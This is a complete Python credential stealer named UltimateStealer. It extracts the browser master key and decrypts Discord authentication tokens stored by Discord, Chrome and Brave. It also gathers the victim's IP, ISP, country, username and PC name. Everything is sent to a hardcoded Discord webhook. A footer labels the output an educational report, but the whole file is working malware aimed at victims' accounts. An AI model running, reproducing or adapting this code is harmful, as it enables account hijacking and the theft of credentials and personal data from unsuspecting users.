import os, re, json, base64, sqlite3, requests, subprocess, shutil
from PIL import ImageGrab
import win32crypt
try: from Cryptodomex.Cipher import AES
except: from Cryptodome.Cipher import AES

# --- CONFIGURATION (Style DeKrypt) ---
config = {
    "webhook": "https://discord.com/api/webhooks/1418902069984759868/QeEnBq9MY1Krb1eWER3P7NPDwhJK8QoqZVjHJVkWWxiJhsgNkO-Hv3FbOQ9JlCrKU8nH",
    "username": "r4z",
    "color": 0x00FFFF, # نفس اللون اللي في الكود ديالك
    "image": "https://files.catbox.moe/yp5a33.jpg"
}

class UltimateStealer:
    def __init__(self):
        self.tokens = []
        self.appdata = os.getenv('APPDATA')
        self.local = os.getenv('LOCALAPPDATA')

    def get_master_key(self, path):
        if not os.path.exists(path): return None
        with open(path, "r", encoding='utf-8') as f:
            local_state = json.loads(f.read())
        m_key = win32crypt.CryptUnprotectData(base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:], None, None, None, 0)[1]
        return m_key

    def decrypt_val(self, buff, master_key):
        try:
            iv, payload = buff[3:15], buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            return cipher.decrypt(payload)[:-16].decode()
        except: return None

    def grab_tokens(self):
        paths = {
            'Discord': os.path.join(self.appdata, 'discord'),
            'Discord Canary': os.path.join(self.appdata, 'discordcanary'),
            'Chrome': os.path.join(self.local, r'Google\Chrome\User Data\Default'),
            'Brave': os.path.join(self.local, r'BraveSoftware\Brave-Browser\User Data\Default')
        }
        for name, path in paths.items():
            leveldb = os.path.join(path, 'Local Storage', 'leveldb')
            if not os.path.exists(leveldb): continue
            m_key = self.get_master_key(os.path.join(path, "Local State"))
            
            for file_name in os.listdir(leveldb):
                if file_name.endswith(('.log', '.ldb')):
                    with open(os.path.join(leveldb, file_name), 'r', errors='ignore') as f:
                        for line in f.readlines():
                            line = line.strip()
                            # التوكينات المشفرة (New Discord Logic)
                            for token in re.findall(r"dQw4w9WgXcQ:([^ ]*)", line):
                                if m_key:
                                    dec_token = self.decrypt_val(base64.b64decode(token.split('"')[0]), m_key)
                                    if dec_token and dec_token not in self.tokens: self.tokens.append(dec_token)
                            # التوكينات العادية
                            for token in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", line):
                                if token not in self.tokens: self.tokens.append(token)

    def get_network_info(self):
        try:
            # استخدام نفس الـ API اللي في كود DeKrypt
            return requests.get("http://ip-api.com/json/?fields=225545").json()
        except: return {}

    def report(self):
        self.grab_tokens()
        net = self.get_network_info()
        
        # بناء الـ Embed بنفس ستايل Image Logger
        embed = {
            "title": "🚀 New System Log Captured",
            "color": config["color"],
            "thumbnail": {"url": config["image"]},
            "fields": [
                {
                    "name": "🌐 IP Information",
                    "value": f"**IP:** `{net.get('query')}`\n**ISP:** `{net.get('isp')}`\n**Country:** `{net.get('country')}`\n**VPN:** `{net.get('proxy')}`",
                    "inline": False
                },
                {
                    "name": "🔑 Captured Tokens",
                    "value": "\n".join([f"`{t}`" for t in self.tokens]) if self.tokens else "No tokens found",
                    "inline": False
                },
                {
                    "name": "💻 System Info",
                    "value": f"**User:** `{os.getlogin()}`\n**PC Name:** `{os.getenv('COMPUTERNAME')}`",
                    "inline": True
                }
            ],
            "footer": {"text": "Security Educational Report | DeKrypt Logic"}
        }
        
        requests.post(config["webhook"], json={"username": config["username"], "embeds": [embed]})

    def run(self):
        self.report()

if __name__ == "__main__":
    UltimateStealer().run()
